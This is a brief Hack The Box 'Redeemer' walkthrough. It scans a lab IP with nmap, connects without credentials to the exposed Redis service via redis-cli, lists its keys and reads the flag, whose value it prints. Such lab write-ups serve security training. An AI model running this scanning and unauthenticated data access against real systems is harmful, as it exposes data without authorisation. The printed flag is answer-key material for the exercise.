# HTB – Redeemer Walkthrough

## Target IP
`10.129.196.208`

## Tools Used
- nmap
- redis-cli

## Enumeration

```bash
 nmap -p- -sV 10.129.196.208
```

Discovered: 6379/tcp open with Redis service running

## Redit Enumeration

Connected to Redit:

```bash
 redis-cli 10.129.196.208
```

Once Connected: 

```bash
info
```
The keyspace section provides information on the main dictionary of each database. The stats also show the number of keys and their expiration if there are any.

Then we the Redis database by using the select command.

```bash
select 0
```

Displayed all keys in the database by running the keys command

```bash
keys *
```

And finally, we can view the values stored for each key shown, and using the get command we can view them

```bash
get flag
```

## Flag Summary

03e1d2b376c37ab3f5319922053953eb

Rooted.
